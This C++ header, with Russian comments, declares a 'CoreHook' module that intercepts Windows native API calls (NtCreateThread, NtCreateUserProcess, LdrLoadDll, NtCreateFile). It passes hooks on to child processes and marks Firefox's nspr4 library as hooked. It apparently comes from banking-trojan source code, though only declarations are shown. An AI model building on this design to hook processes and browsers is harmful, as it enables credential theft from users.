/*
  Хуки ядра.
*/
#pragma once

#include "..\common\ntdll.h"

namespace CoreHook
{
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);

  /*
    Отключить перехватчик откртия файла для текущего потока.

    IN disable - true - отключить, false - включить.
  */
  void disableFileHookerForCurrentThread(bool disable);
  
  /*
    Установка флагов Core::CDPF_* для создания дочерного процесса из текущего потока. Флаг
    сбрасывается в случаи успешного создания процесса.

    IN processFlags - Core::CDPF_*. Флаги по маске Core::CDPT_INHERITABLE_MASK всеравно будут
                      унаследованы.

    Return          - true - в сулчаи успеха,
                      false - в случаи провала.
  */
#if defined HOOKER_SETCHILDPROCESSFLAGS
  bool setChildProcessFlags(DWORD processFlags);
#endif

#if(BO_NSPR4 > 0)
  /*
    Функцция для утсановки метки, что nspr4 успешно перехвачен и не нужно его отслеживать в
    hookerLdrLoadDll.
  */
  void __forceinline markNspr4AsHooked(void);
#endif

  /*
    Перехватчик NtCreateThread.
  */  
  NTSTATUS NTAPI hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended);

  /*
    Перехватчик NtCreateUserProcess.
  */
  NTSTATUS NTAPI hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList);

  /*
    Перехватчик LdrLoadDll.
  */
#if defined(HOOKER_LDRLOADDLL)
  NTSTATUS NTAPI hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle);
#endif  

  /*
    Перехватчик NtQueryDirectoryFile.
  */
#if(0)
  NTSTATUS NTAPI hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
#endif

  /*
    Перехватчик NtCreateFile.
  */
#if defined(HOOKER_NTCREATEFILE)
  NTSTATUS NTAPI hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength);
#endif

  /*
    Перехватчик GetFileAttributesExW
  */
  BOOL WINAPI hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation);
};
